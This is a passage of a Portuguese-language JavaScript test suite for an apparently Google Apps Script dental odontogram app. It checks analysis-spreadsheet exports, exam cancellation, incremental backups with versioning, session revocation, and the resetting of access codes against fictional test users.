T("cancelados entram, marcados, com o motivo do cancelamento", canceladosIdx.length > 0 && canceladosIdx.every(x => { const l = anEx.find(e => e[0] === x.id); return l && l[anEx[0].indexOf("situacao_registro")] === "cancelado" && !!l[anEx[0].indexOf("motivo_cancelamento")]; }), canceladosIdx.map(x => x.id));
const somaDentes = todosIdx.reduce((t, x) => t + Object.keys(JSON.parse(linhaEx(x.id).at(-1)).dentes).length, 0);
T("aba Dentes: uma linha por dente de cada exame", anDe.length - 1 === somaDentes && anDe[0].join() === require("vm").runInContext("CAB_AN_DENTES", G.ctx).join(), [anDe.length - 1, somaDentes]);
const cD = k => anDe[0].indexOf(k), cE = k => anEx[0].indexOf(k);
const comCarie = anDe.slice(1).find(l => l[cD("face_oclusal_incisal")] === "Cárie ativa");
const exDaLinha = comCarie && anEx.find(l => l[cE("id_exame")] === comCarie[cD("id_exame")]);
T("cada dente traz o exame dele (id_exame, DSEI, faixa etária e sexo iguais aos da aba Exames)", !!exDaLinha && ["dsei", "faixa_etaria", "sexo", "data_exame", "codigo_individuo"].every(k => String(comCarie[cD(k)]) === String(exDaLinha[cE(k)])), comCarie);
T("conta pronta por dente: tem_carie e faces_com_carie", comCarie && comCarie[cD("tem_carie")] === "sim" && comCarie[cD("faces_com_carie")] >= 1 && anDe.slice(1).some(l => l[cD("tem_carie")] === "não" && l[cD("faces_com_carie")] === 0));
T("todo dente aponta para um exame que está na aba Exames", anDe.slice(1).every(l => anEx.some(e => e[0] === l[0])));
T("a aba Sobre diz quando foi atualizada e quantos exames tem", pAn.abas.Sobre.some(l => l[0] === "Exames válidos" && l[1] === String(validosIdx.length)));
// Novas colunas de Dentes: as antigas continuam na mesma ordem (o Looker não perde nada).
const vmv = n => require("vm").runInContext(n, G.ctx);
T("Dentes: as colunas antigas continuam na mesma ordem e as novas vêm no fim", anDe[0].slice(0, 26).join() === "id_exame,codigo_individuo,numero_exame,data_exame,dsei,polo_base,aldeia_comunidade,faixa_etaria,sexo,idade_anos,dente,tipo,situacao,sigla,tem_carie,faces_com_carie,face_oclusal_incisal,face_vestibular,face_lingual_palatina,face_mesial,face_distal,dor,abscesso_fistula,procedimentos_indicados,procedimentos_realizados,observacao" && anDe[0].includes("grupo_dente"));
const d16 = anDe.slice(1).find(l => l[cD("dente")] === 16), d11 = anDe.slice(1).find(l => l[cD("dente")] === 11), d53 = anDe.slice(1).find(l => l[cD("dente")] === 53);
T("Dentes: arcada, lado e grupo de cada dente", d16[cD("arcada")] === "superior" && d16[cD("lado")] === "direito" && d16[cD("grupo_dente")] === "molar" && d11[cD("grupo_dente")] === "incisivo" && d53[cD("grupo_dente")] === "canino" && d53[cD("tipo")] === "decíduo", [d16 && d16.slice(-11), d53 && d53.slice(-11)]);
// Procedimentos: uma linha por procedimento de cada dente, com a condição daquele dente.
const anPr = pAn.abas.Procedimentos, cP = k => anPr[0].indexOf(k);
const procsEsperados = todosIdx.reduce((t, x) => t + Object.values(JSON.parse(linhaEx(x.id).at(-1)).dentes).reduce((s, d) => s + Object.values(d.procs || {}).filter(v => v === "indicado" || v === "realizado").length, 0), 0);
T("Procedimentos: uma linha por procedimento indicado ou realizado em cada dente", anPr.length - 1 === procsEsperados && procsEsperados > 0, [anPr.length - 1, procsEsperados]);
const exOK2 = validosIdx.find(x => x.id === "OK2"), prOK2 = anPr.slice(1).filter(l => l[cP("id_exame")] === "OK2" && l[cP("dente")] === 16);
T("Procedimentos: selante realizado e verniz indicado no mesmo dente viram duas linhas, cada uma com o momento", !exOK2 || (prOK2.length === 2 && prOK2.some(l => l[cP("codigo_procedimento")] === "selante" && l[cP("momento")] === "realizado" && l[cP("procedimento")] === "Selante") && prOK2.some(l => l[cP("codigo_procedimento")] === "verniz" && l[cP("momento")] === "indicado")), prOK2);
T("Procedimentos: cada linha traz a condição do dente (cárie, dor, abscesso) e o exame dele", anPr.slice(1).every(l => ["sim", "não"].includes(l[cP("tem_carie")]) && ["sim", "não"].includes(l[cP("dor_ou_abscesso")]) && anEx.some(e => e[0] === l[0])));
T("Exames: perfil do profissional no exame e hoje, e contas prontas", ["perfil_profissional_no_exame", "perfil_profissional_atual", "n_dentes_com_carie", "n_procedimentos_realizados"].every(k => anEx[0].includes(k))
  && anEx.slice(1).every(l => l[cE("perfil_profissional_no_exame")] !== ""), anEx.slice(1).map(l => l[cE("perfil_profissional_no_exame")]).slice(0, 5));
// Faces: planilha separada, uma linha por face de cada dente presente.
const pFa = planilhaExtra("Odontograma - análise - faces"), anFa = pFa && pFa.abas.Faces, cF = k => anFa[0].indexOf(k);
const facesEsperadas = todosIdx.reduce((t, x) => t + Object.values(JSON.parse(linhaEx(x.id).at(-1)).dentes).filter(d => d.status === "presente").length * 5, 0);
T("Faces: planilha à parte (limite de células do Google), com as abas Faces e Sobre", pFa && pFa.ordem.join() === "Faces,Sobre", pFa && pFa.ordem);
T("Faces: uma linha por face de cada dente presente", anFa.length - 1 === facesEsperadas, [anFa.length - 1, facesEsperadas]);
const fa = (n, f) => anFa.slice(1).find(l => l[cF("dente")] === n && l[cF("face_nome")] === f);
T("Faces: letra certa da face (I nos anteriores, P nos superiores) e o nome que junta as faces equivalentes", fa(11, "oclusal/incisal")[cF("face")] === "I" && fa(16, "lingual/palatina")[cF("face")] === "P" && fa(46, "lingual/palatina")[cF("face")] === "L" && fa(16, "mesial")[cF("face")] === "M");
const cariada = anFa.slice(1).find(l => l[cF("condicao")] === "Cárie ativa");
T("Faces: condição, cárie e cárie ativa por face", cariada && cariada[cF("tem_carie")] === "sim" && cariada[cF("tem_carie_ativa")] === "sim" && anFa.slice(1).some(l => l[cF("condicao")] === "Hígida" && l[cF("tem_carie")] === "não"), cariada);
T("Faces: todo id_exame existe na aba Exames", anFa.slice(1).every(l => anEx.some(e => e[0] === l[0])));
// situacao_registro e id_exame_dente em todas as abas por dente.
const chavesDentes = new Set(anDe.slice(1).map(l => l[cD("id_exame_dente")]));
T("id_exame_dente: único em Dentes e no formato id_exame|dente", chavesDentes.size === anDe.length - 1 && anDe.slice(1).every(l => l[cD("id_exame_dente")] === l[cD("id_exame")] + "|" + l[cD("dente")]));
T("todo procedimento e toda face apontam para um dente da aba Dentes (id_exame_dente)", anPr.slice(1).every(l => chavesDentes.has(l[cP("id_exame_dente")])) && anFa.slice(1).every(l => chavesDentes.has(l[cF("id_exame_dente")])));
const sitDe = new Map(anDe.slice(1).map(l => [l[cD("id_exame_dente")], l[cD("situacao_registro")]]));
T("situacao_registro em Dentes, Procedimentos e Faces, igual à do exame", [[anDe, cD], [anPr, cP], [anFa, cF]].every(([t, c]) => t.slice(1).every(l => l[c("situacao_registro")] === anEx.find(e => e[0] === l[0])[cE("situacao_registro")]))
  && anDe.slice(1).some(l => l[cD("situacao_registro")] === "cancelado") && anFa.slice(1).every(l => sitDe.get(l[cF("id_exame_dente")]) === l[cF("situacao_registro")]));
T("a aba Sobre avisa para filtrar situacao_registro = válido", pAn.abas.Sobre.some(l => l[0] === "Atenção" && /situacao_registro/.test(l[1])) && pFa.abas.Sobre.some(l => l[0] === "Atenção"));
const proibidas = /hash|token|senha|sessao|json|chave/i;
const colunasAnalise = [anEx[0], anDe[0], anPr[0], anFa[0]].flat();
T("nenhuma coluna técnica de acesso nas planilhas de análise (hashes, tokens, senhas, sessões)", !colunasAnalise.some(k => proibidas.test(k)), colunasAnalise.filter(k => proibidas.test(k)));
T("nenhum código de acesso nem hash nas planilhas de análise", ![pAn, pFa].some(x => { const t = JSON.stringify(x.abas); return t.includes(ANA.codigo) || G.est.sheets.Usuarios.slice(1).some(u => u[9] && t.includes(u[9])); }));
T("Administração mostra também a planilha de faces", P(C, { acao: "admin" }).analise.faces.ok === true && /docs\.google\.com/.test(P(C, { acao: "admin" }).analise.faces.url));
T("refazer a planilha de análise não apaga a cópia rápida da planilha do app", !!G.ctx.lerDaMemoria("indice+") && !!G.ctx.lerDaMemoria("resumos+"));
r = P(C, { acao: "admin" });
T("Administração (titular) mostra a planilha de análise: quando, quantos, espaço e o link", r.analise && r.analise.ok && r.analise.exames === todosIdx.length && r.analise.validos === validosIdx.length && /docs\.google\.com/.test(r.analise.url) && r.analise.pct >= 0, r.analise);
T("outra pessoa da coordenação não vê nem atualiza a planilha de análise", P(PAULA, { acao: "admin" }).analise === null && !P(PAULA, { acao: "atualizarAnalise" }).ok);
T("dentista não atualiza a planilha de análise", !P(ANA, { acao: "atualizarAnalise" }).ok);
// Conferência: um exame válido na planilha do app que não pôde ir para a análise (dados quebrados) é avisado.
const quebrada = linhaEx(validosIdx[0].id).slice(); quebrada[0] = "QUEBRADO1"; quebrada[quebrada.length - 1] = "{quebrado"; aba("Exames").push(quebrada); editouAMao("Exames");
const nErros0 = aba("_erros").length;
r = P(C, { acao: "atualizarAnalise" });
T("se os números não batem com a planilha do app, a atualização avisa (e vai para Erros recentes)", !r.ok && r.analise && !r.analise.ok && /Conferência/.test(r.analise.erro) && aba("_erros").length === nErros0 + 1 && aba("_erros").at(-1)[2] === "analise", [r, aba("_erros").at(-1)]);
aba("Exames").splice(aba("Exames").findIndex(l => l[0] === "QUEBRADO1"), 1); editouAMao("Exames");
T("corrigido, volta a bater", P(C, { acao: "atualizarAnalise" }).ok);
// O Looker guarda o número interno de cada aba: as abas não podem ser apagadas e criadas de novo.
const idsAbas = () => ["Exames", "Dentes", "Sobre"].map(n => G.ctx.planilhaAnalise().getSheetByName(n).getSheetId()).join();
const ids0 = idsAbas(), nDentes0 = pAn.abas.Dentes.length;
r = P(ANA, { acao: "cancelarExame", id: validosIdx[0].id, motivo: "Exame em duplicidade" });
const refPost = G.ctx.lerIndiceDaPlanilha().find(x => x.anteriorId === validosIdx[0].id && x.situacao !== "cancelado");
T("cancelar um exame usado como referência por um exame posterior: o servidor pede confirmação e não cancela", !!refPost && !r.ok && r.confirmar && r.referencia.some(x => x.id === refPost.id) && /referência/.test(r.erro) && jsonEx(validosIdx[0].id).situacao !== "cancelado", r);
r = P(ANA, { acao: "cancelarExame", id: validosIdx[0].id, motivo: "Exame em duplicidade", confirmado: true });
T("confirmado, cancela e registra quais exames o usaram como referência", r.ok && r.exame.cancelamento.referenciaDe.includes(refPost.id) && r.exame.cancelamento.examesPosteriores.includes(refPost.id), r.exame && r.exame.cancelamento);
T("o exame posterior não é alterado: continua apontando para o exame usado na época", G.ctx.lerIndiceDaPlanilha().find(x => x.id === refPost.id).anteriorId === validosIdx[0].id && jsonEx(refPost.id).vinculo.anteriorId === validosIdx[0].id);
T("o registro em Acessos diz que o exame era referência", aba("Acessos").some(l => l[7] === "Cancelou exame" && /era referência de 1 exame posterior/.test(l[8])));
T("atualizar de novo reescreve dentro das mesmas abas (o Looker continua ligado a elas)", P(C, { acao: "atualizarAnalise" }).ok && idsAbas() === ids0, [ids0, idsAbas()]);
T("exame cancelado continua nas abas, agora marcado como cancelado (os dentes também)", pAn.abas.Dentes.length === nDentes0 && pAn.abas.Exames.find(l => l[0] === validosIdx[0].id)[cE("situacao_registro")] === "cancelado"
  && pAn.abas.Dentes.filter(l => l[0] === validosIdx[0].id).every(l => l[cD("situacao_registro")] === "cancelado") && G.ctx.estadoAnalise().validos === validosIdx.length - 1,
  [pAn.abas.Dentes.length, nDentes0, G.ctx.estadoAnalise()]);
// Sem sobras: com menos linhas (uma linha da planilha do app apagada à mão), a aba é encurtada.
const linhaApagadaAn = aba("Exames").findIndex(l => l[0] === validosIdx[1].id), guardadaAn = aba("Exames")[linhaApagadaAn];
aba("Exames").splice(linhaApagadaAn, 1); editouAMao("Exames");
T("com menos exames, não sobram linhas da versão anterior", P(C, { acao: "atualizarAnalise" }).ok && pAn.abas.Dentes.length < nDentes0 && pAn.abas.Dentes.length - 1 === G.ctx.estadoAnalise().dentes && pAn.abas.Exames.length - 1 === G.ctx.estadoAnalise().exames,
  [pAn.abas.Dentes.length, nDentes0, G.ctx.estadoAnalise()]);
aba("Exames").splice(linhaApagadaAn, 0, guardadaAn); editouAMao("Exames");
T("a aba Sobre termina sem o aviso de atualização em andamento", !pAn.abas.Sobre.some(l => /em andamento/.test(l[1])) && pAn.abas.Sobre.some(l => l[0] === "Exames válidos"));
T("a tarefa diária também refaz a planilha de análise, nas mesmas abas", G.ctx.tarefaDiaria().analise === todosIdx.length && idsAbas() === ids0);
T("a planilha de faces tem a sua própria tarefa da madrugada", G.est.triggers.some(t => t.fn === "tarefaFaces") && G.ctx.tarefaFaces() === G.ctx.estadoFaces().faces && planilhaExtra("Odontograma - análise - faces").abas.Faces.length - 1 === G.ctx.estadoFaces().faces);

/* ---------------------------------------------------------------- backup incremental */
parte("backup incremental");
const bkTab = n => bk().abas[n] || [];
const bkObj = n => { const t = bkTab(n); return t.slice(1).map(l => Object.fromEntries(t[0].map((k, i) => [k, l[i]]))); };
const bkEx = id => bkObj("Exames").find(x => x.id_exame === id);
const bkCad = email => bkObj("Cadastros").find(x => x.email === email);
const idsMain = [...new Set(G.ctx.lerIndiceDaPlanilha().map(x => x.id))];
T("uma pasta e uma planilha de backup só, com todas as abas, e nenhuma cópia inteira da planilha", Object.values(G.est.extras).filter(x => x.nome === "Odontograma - backup").length === 1 && G.est.backups.length === 0 && bk().ordem.join() === vmv("BK_ABAS").join(), bk().ordem);
T("todo exame da planilha principal (válidos e cancelados) está no backup, uma linha cada", idsMain.every(id => bkObj("Exames").filter(x => x.id_exame === id).length === 1), idsMain.filter(id => !bkEx(id)));
const cancBk = bkEx(validosIdx[0].id);
T("exame cancelado: os dados clínicos originais continuam; motivo, data e responsável ficam na situação atual", cancBk.situacao_atual === "cancelado" && cancBk.motivo_cancelamento === "Exame em duplicidade" && cancBk.cancelado_por === "Ana Dentista" && cancBk.cancelado_por_id === S.idDe("ana@teste.org") && !!cancBk.cancelado_em
  && Object.keys(JSON.parse(cancBk.dados_originais_json).dentes).length > 0, cancBk);
T("cadastros no backup, com o código de acesso só como hash (para reconstruir) e nunca em texto", bkObj("Cadastros").length === G.est.sheets.Usuarios.length - 1 && !!bkCad("ana@teste.org").codigo_hash && !JSON.stringify(G.est.extras).includes(ANA.codigo) && !JSON.stringify(G.est.extras).includes(S.SENHA_TITULAR));
T("ações do Dia B, convites, códigos reservados e Acessos também vão para o backup", bkTab("Codigos_reservados").length > 1 && bkTab("Acessos").length > 10 && bkTab("Convites").length >= 1 && bkTab("Acoes_Dia_B").length >= 1, ["Codigos_reservados", "Acessos", "Convites", "Acoes_Dia_B"].map(n => bkTab(n).length));
const tam = () => ["Exames", "Exames_versoes", "Alertas", "Historico", "Cadastros", "Acessos"].map(n => bkTab(n).length);
let rb = G.ctx.fazerBackup("teste"); const t1 = tam();
rb = G.ctx.fazerBackup("teste"); const t2 = tam();
T("sem mudanças, o backup não acrescenta nada (em Acessos, só o registro do backup anterior)", rb.exames.novos === 0 && rb.exames.versoes === 0 && rb.alertasNovos === 0 && t2.slice(0, 5).join() === t1.slice(0, 5).join() && t2[5] === t1[5] + 1, [t1, t2]);
// Exame novo, depois alterado: a versão original nunca é reescrita.
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "BKX", sufixo: "BKXBKXB2", mud: { 26: { faces: { O: "ca" } } } }) });
T("(exame novo para o backup)", r.ok, r);
rb = G.ctx.fazerBackup("teste");
const bkx0 = bkEx("BKX");
T("o exame novo entra no backup completo, com o perfil e o DSEI do profissional no momento do exame", rb.exames.novos === 1 && bkx0.versao_atual === "1" && bkx0.perfil_profissional_no_exame === "cirurgião-dentista" && bkx0.dsei_profissional_no_exame === "Yanomami" && bkx0.origem_perfil_no_exame === "registrado no exame"
  && JSON.parse(bkx0.dados_originais_json).dentes[26].faces.O === "ca", bkx0);
const ed = jsonEx("BKX"); ed.dentes[16].faces.O = "ca"; ed.dentes[26].faces.O = ""; ed.atualizadoEm = new Date().toISOString();
r = P(ANA, { acao: "enviarExame", registro: ed });
T("(o exame é alterado depois de enviado)", r.ok, r);
const mailsBk0 = mailsPara("coord@teste.org").length;
rb = G.ctx.fazerBackup("teste");
const bkx1 = bkEx("BKX"), vers = bkObj("Exames_versoes").filter(x => x.id_exame === "BKX");
T("exame alterado: a versão original continua igual e a nova entra em Exames_versoes", bkx1.dados_originais_json === bkx0.dados_originais_json && bkx1.versao_atual === "2" && vers.length === 1 && vers[0].versao === "2" && JSON.parse(vers[0].dados_json).dentes[16].faces.O === "ca", [bkx1.versao_atual, vers]);
T("a versão nova diz o que mudou (dentes 16 e 26)", vers[0].o_que_mudou === "dentes 16, 26", vers[0].o_que_mudou);
T("exame alterado gera alerta e e-mail para a coordenação titular", bkObj("Alertas").some(a => a.tipo === "Exame alterado depois de enviado" && a.registro === "BKX" && /Versão 2/.test(a.detalhe)) && mailsPara("coord@teste.org").length === mailsBk0 + 1 && /backup encontrou 1 alerta/.test(mailsPara("coord@teste.org").at(-1).subject), bkObj("Alertas").slice(-2));
rb = G.ctx.fazerBackup("teste");
T("a mesma alteração não vira outra versão no backup seguinte", rb.exames.versoes === 0 && bkObj("Exames_versoes").filter(x => x.id_exame === "BKX").length === 1);
// Corrigido duas vezes ANTES do primeiro backup: o original é o primeiro envio, e nenhuma versão se perde.
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "BKY", sufixo: "BKYBKYB2" }) });
const y1 = jsonEx("BKY"); y1.dentes[36].faces.O = "ca"; y1.atualizadoEm = new Date(Date.now() + 1000).toISOString();
const r1 = P(ANA, { acao: "enviarExame", registro: y1 });
const y2 = jsonEx("BKY"); y2.dentes[46].faces.O = "ca"; y2.atualizadoEm = new Date(Date.now() + 2000).toISOString();
const r2 = P(ANA, { acao: "enviarExame", registro: y2 });
T("(o exame é enviado e corrigido duas vezes antes do backup)", r.ok && r1.ok && r2.ok && aba("_versoes_exames").filter(l => l[0] === "BKY").length === 2, [r1, r2]);
rb = G.ctx.fazerBackup("teste");
const bky = bkEx("BKY"), versY = bkObj("Exames_versoes").filter(x => x.id_exame === "BKY");
T("o original no backup é o primeiro envio, não a versão da hora do backup", JSON.parse(bky.dados_originais_json).dentes[36].faces.O === "" && JSON.parse(bky.dados_originais_json).dentes[46].faces.O === "", bky.versao_atual);
T("as duas correções feitas antes do backup viram as versões 2 e 3, cada uma com o que mudou", bky.versao_atual === "3" && versY.map(x => x.versao + ":" + x.o_que_mudou).join() === "2:dentes 36,3:dentes 46", versY.map(x => x.versao + ":" + x.o_que_mudou));
r = P(ANA, { acao: "cancelarExame", id: "BKY", motivo: "Digitado errado" });
T("cancelar não é uma versão nova (os dados clínicos não mudam)", r.ok && aba("_versoes_exames").filter(l => l[0] === "BKY").length === 2);
rb = G.ctx.fazerBackup("teste");
T("e o backup marca o cancelamento sem criar versão", rb.exames.versoes === 0 && bkEx("BKY").situacao_atual === "cancelado" && bkEx("BKY").versao_atual === "3" && bkEx("BKY").motivo_cancelamento === "Digitado errado");
rb = G.ctx.fazerBackup("teste");
T("backup sem mudanças não regrava nenhuma linha de exame (incremental também na gravação)", rb.exames.linhasGravadas === 0 && rb.exames.novos === 0, rb.exames);
// Perfil da época: a pessoa vira RT no mesmo DSEI e corrige um exame antigo; o exame continua dizendo cirurgião-dentista.
const idAna = S.idDe("ana@teste.org"), linAna = aba("Usuarios").find(l => l[0] === idAna), cPerfil = aba("Usuarios")[0].indexOf("perfil");
linAna[cPerfil] = "rt"; editouAMao("Usuarios");
const z = jsonEx("BKX"); z.dentes[11].faces.V = "mba"; z.atualizadoEm = new Date(Date.now() + 3000).toISOString();
r = P(ANA, { acao: "enviarExame", registro: z });
T("correção depois de virar RT: o perfil e o DSEI do exame continuam os da época", r.ok && jsonEx("BKX").profissional.perfil === "cirurgião-dentista" && jsonEx("BKX").profissional.dsei === "Yanomami", r.ok ? jsonEx("BKX").profissional : r);
rb = G.ctx.fazerBackup("teste");
T("no backup, o perfil no exame continua o da época e o de hoje aparece à parte", bkEx("BKX").perfil_profissional_no_exame === "cirurgião-dentista" && bkEx("BKX").perfil_profissional_atual === "referência técnica", [bkEx("BKX").perfil_profissional_no_exame, bkEx("BKX").perfil_profissional_atual]);
linAna[cPerfil] = "dentista"; editouAMao("Usuarios");
// Exame que some da planilha principal: continua no backup, com alerta.
const linhaBKX = aba("Exames").findIndex(l => l[0] === "BKX"), guardada = aba("Exames")[linhaBKX];
aba("Exames").splice(linhaBKX, 1); editouAMao("Exames");
rb = G.ctx.fazerBackup("teste");
const bkx2 = bkEx("BKX");
T("exame apagado da planilha principal: continua no backup, marcado e com a data", bkx2 && bkx2.na_planilha_principal === "não" && !!bkx2.sumiu_da_principal_em && bkx2.dados_originais_json === bkx0.dados_originais_json && rb.exames.sumiram === 1, bkx2 && bkx2.na_planilha_principal);
T("e gera o alerta \"Exame sumiu da planilha principal\"", bkObj("Alertas").some(a => a.tipo === "Exame sumiu da planilha principal" && a.registro === "BKX"));
aba("Exames").splice(linhaBKX, 0, guardada); editouAMao("Exames");
rb = G.ctx.fazerBackup("teste");
T("se o exame voltar, o backup marca de novo e avisa", bkEx("BKX").na_planilha_principal === "sim" && !bkEx("BKX").sumiu_da_principal_em && bkObj("Alertas").some(a => a.tipo === "Exame voltou para a planilha principal" && a.registro === "BKX"));
// Cadastro que muda: o passado fica, a situação atual muda e a mudança vai para o Historico.
const idBruno = S.idDe("bruno@teste.org"), linBruno = aba("Usuarios").find(l => l[0] === idBruno), cDsei = aba("Usuarios")[0].indexOf("dsei");
const exBruno = G.ctx.lerIndiceDaPlanilha().find(x => x.usuarioId === idBruno && x.situacao !== "cancelado");
r = P(RT, { acao: "desativar", id: idBruno });
linBruno[cDsei] = "Leste de Roraima"; editouAMao("Usuarios");
rb = G.ctx.fazerBackup("teste");
const cadB = bkCad("bruno@teste.org"), histB = bkObj("Historico").filter(h => h.registro === idBruno);
T("cadastro: como era no início fica nas colunas _inicial; a situação de hoje nas colunas normais", r.ok && cadB.dsei_inicial === "Yanomami" && cadB.status_inicial === "ativo" && cadB.dsei === "Leste de Roraima" && cadB.status === "desativado" && !!cadB.ultima_mudanca_em, cadB);
T("cada mudança de cadastro vai para o Historico, com o valor anterior e o novo", histB.some(h => h.campo === "dsei" && h.valor_anterior === "Yanomami" && h.valor_novo === "Leste de Roraima") && histB.some(h => h.campo === "status" && h.valor_anterior === "ativo" && h.valor_novo === "desativado"), histB);
const bkB = bkEx(exBruno.id);
T("exame do profissional: o DSEI e o perfil no exame não mudam; o DSEI e a situação de hoje ficam à parte", bkB.dsei_profissional_no_exame === "Yanomami" && bkB.dsei_profissional_atual === "Leste de Roraima" && bkB.situacao_profissional_atual === "desativado" && bkB.dsei === "Yanomami", bkB);
r = P(C, { acao: "atualizarAnalise" });
const exAn = planilhaExtra("Odontograma - análise").abas.Exames, lB = exAn.find(l => l[0] === exBruno.id), cA = k => exAn[0].indexOf(k);
T("planilha de análise: o perfil no exame é o da época e o DSEI de hoje fica em dsei_profissional_atual", r.ok && lB[cA("perfil_profissional_no_exame")] === "cirurgião-dentista" && lB[cA("dsei")] === "Yanomami" && lB[cA("dsei_profissional_atual")] === "Leste de Roraima" && lB[cA("situacao_profissional_atual")] === "desativado", lB && [lB[cA("perfil_profissional_no_exame")], lB[cA("dsei_profissional_atual")]]);
linBruno[cDsei] = "Yanomami"; editouAMao("Usuarios"); P(RT, { acao: "reativar", id: idBruno });
// Administração, permissões e proteção contra dois backups ao mesmo tempo.
r = P(C, { acao: "fazerBackup" });
T("a titular faz o backup pela Administração", r.ok && r.backup.ok && /docs\.google\.com/.test(r.backup.url), r);
T("Administração (titular) mostra o último backup e os alertas", P(C, { acao: "admin" }).backup.ok === true && P(C, { acao: "admin" }).backup.alertas >= 3);
T("outra pessoa da coordenação e dentistas não fazem nem veem o backup", !P(PAULA, { acao: "fazerBackup" }).ok && P(PAULA, { acao: "admin" }).backup === null && !P(ANA, { acao: "fazerBackup" }).ok);
G.est.props.BACKUP_ANDAMENTO = String(Date.now());
r = P(C, { acao: "fazerBackup" });
T("dois backups ao mesmo tempo: o segundo espera", !r.ok && /em andamento/.test(r.erro), r);
delete G.est.props.BACKUP_ANDAMENTO;
G.est.falharBackup = true;
r = P(C, { acao: "fazerBackup" });
T("se a planilha de backup não abrir, nenhuma outra é criada no lugar", !r.ok && /backup/i.test(G.ctx.estadoBackup().erro) && Object.values(G.est.extras).filter(x => x.nome === "Odontograma - backup").length === 1, r);
G.est.falharBackup = false;
T("o erro do backup aparece em Erros recentes, explicado", aba("_erros").some(l => l[2] === "backup"), aba("_erros").slice(-1));
G.ctx.ScriptApp.newTrigger("fazerBackup").timeBased().onWeekDay(1).atHour(3).create();
G.ctx.garantirTarefaDiaria();
T("o backup semanal antigo (cópia inteira) é desligado sozinho", !G.est.triggers.some(t => t.fn === "fazerBackup") && G.est.triggers.some(t => t.fn === "tarefaDiaria"));

/* ---------------------------------------------------------------- sessões */
parte("sessões");
const sessoesDe = id => Object.keys(G.est.props).filter(k => k.startsWith("sessao_") && JSON.parse(G.est.props[k]).u === id);
const idCarla = S.idDe("carla@teste.org");
const sC1 = P(S.CARLA, { acao: "entrar", aparelho: "Celular 1" }).sessao, sC2 = P(S.CARLA, { acao: "entrar", aparelho: "Celular 2" }).sessao;
const comS = t => ({ email: "carla@teste.org", sessao: t });
T("(Carla entra em dois aparelhos)", !!sC1 && !!sC2 && P(comS(sC1), { acao: "inicio" }).ok && sessoesDe(idCarla).length >= 2);
r = P(comS(sC1), { acao: "sair" });
T("Sair deste aparelho encerra a sessão no servidor (um token copiado deixa de valer)", r.ok && P(comS(sC1), { acao: "inicio" }).semAcesso === true && P(comS(sC2), { acao: "inicio" }).ok, r);
r = P(C, { acao: "desativar", id: idCarla });
T("desativar encerra todas as sessões da pessoa e fica anotado", r.ok && sessoesDe(idCarla).length === 0 && aba("Acessos").some(l => l[7] === "Desativou acesso" && /sessões? encerradas?/.test(l[8])), sessoesDe(idCarla));
r = P(C, { acao: "reativar", id: idCarla });
T("reativar não traz de volta a sessão antiga (por exemplo, de um celular perdido)", r.ok && P(comS(sC2), { acao: "inicio" }).semAcesso === true);
T("depois de reativada, a pessoa entra de novo com o mesmo código", P(S.CARLA, { acao: "entrar" }).ok);

/* ---------------------------------------------------------------- geral */
parte("geral");
G.ctx.escreverDicionario(G.ctx.planilha());
const dic = aba("Dicionário").filter(l => l[0] === "Exames").map(l => String(l[1])).join(" · ");
const semDic = G.ctx.CAB_EXAME.filter(k => !dic.split(" · ").includes(k) && !(/^vig_/.test(k) && dic.includes(k)) && !/^n_/.test(k));
T("o Dicionário explica todas as colunas da aba Exames", !semDic.length && dic.includes("n_<tratamento>_indicado"), semDic);
T("nenhuma célula gravada como fórmula em todo o teste", G.est.formulas.length === 0, G.est.formulas.slice(0, 5));
P(ANA, { acao: "meusExames" });
cmp = comparar();
T("no fim de todo o teste (envios, cancelamentos, renumerações, reorganização), a cópia rápida continua igual à planilha", cmp.indice && cmp.resumos && cmp.atual, cmp);
T("nenhuma senha ou código de acesso gravado em texto na planilha", !JSON.stringify(G.est.sheets).includes(S.SENHA_TITULAR) && !JSON.stringify(G.est.sheets).includes(ANA.codigo));

/* ---------------------------------------------------------------- resetar todos os acessos (cenário separado) */
parte("resetar acessos");
{
  const R = cenario(), G2 = R.G, aba2 = n => G2.est.sheets[n] || [];
  const ex = R.P(R.ANA, { acao: "enviarExame", registro: exame({ id: "RST1", sufixo: "RSTRSTR2" }) });
  const sAna = R.P(R.ANA, { acao: "entrar" }).sessao, nExames = aba2("Exames").length;
  const res = G2.ctx.resetarTodosOsAcessos();
  const us = aba2("Usuarios").slice(1), cS = aba2("Usuarios")[0].indexOf("status"), cH = aba2("Usuarios")[0].indexOf("codigo_hash");
  T("resetar: todos os acessos ficam desativados e sem código", ex.ok && res.acessos === us.length && us.every(l => l[cS] === "desativado" && l[cH] === ""), [res, us.map(l => l[cS])]);
  T("ninguém entra com o código antigo nem com a sessão antiga do celular", R.P(R.ANA, { acao: "entrar" }).semAcesso === true && R.P({ email: R.ANA.email, sessao: sAna }, { acao: "inicio" }).semAcesso === true && R.P(R.PAULA, { acao: "entrar" }).semAcesso === true
    && !Object.keys(G2.est.props).some(k => k.startsWith("sessao_") && JSON.parse(G2.est.props[k]).u !== "coord"));
  T("a coordenação titular continua entrando", R.P(R.C, { acao: "entrar" }).ok);
  T("exames, cadastros e histórico continuam; o reset fica anotado em Acessos", aba2("Exames").length === nExames && us.length > 5 && aba2("Acessos").some(l => l[7] === "Resetou todos os acessos" && /sessões encerradas/.test(l[8])));
  const pedido = G2.post({ acao: "pedirAcesso", nome: "Ana Dentista", cro: "RR 1", email: R.ANA.email, uf: "RR", dsei: "Yanomami", perfil: "dentista" });
  T("a pessoa pede acesso de novo: vira pedido de reativação, avisando que virá um código novo", pedido.ok && pedido.reativacao && pedido.codigoNovo === true, pedido);
  G2.est.mails.length = 0;
  let r2 = R.P(R.C, { acao: "reativar", id: R.idDe("rt@teste.org") });
  const codRT = R.codigoDoEmail("rt@teste.org");
  T("ao reativar, a pessoa recebe um código novo por e-mail", r2.ok && r2.codigoNovo && r2.emailEnviado && !!codRT && codRT !== R.RT.codigo, r2);
  T("entra com o código novo; o antigo não vale", R.P({ email: "rt@teste.org", codigo: codRT }, { acao: "entrar" }).ok && R.P(R.RT, { acao: "entrar" }).semAcesso === true);
  r2 = R.P({ email: "rt@teste.org", codigo: codRT }, { acao: "reativar", id: R.idDe("ana@teste.org") });
  const codAna = R.codigoDoEmail("ana@teste.org");
  T("a RT reativa a dentista do DSEI, que também recebe código novo", r2.ok && r2.codigoNovo && R.P({ email: R.ANA.email, codigo: codAna }, { acao: "entrar" }).ok, r2);
  r2 = R.P(R.C, { acao: "desativar", id: R.idDe("bruno@teste.org") });
  T("quem ainda não foi reativado continua sem entrar", r2.ok && R.P(R.BRUNO, { acao: "entrar" }).semAcesso === true);
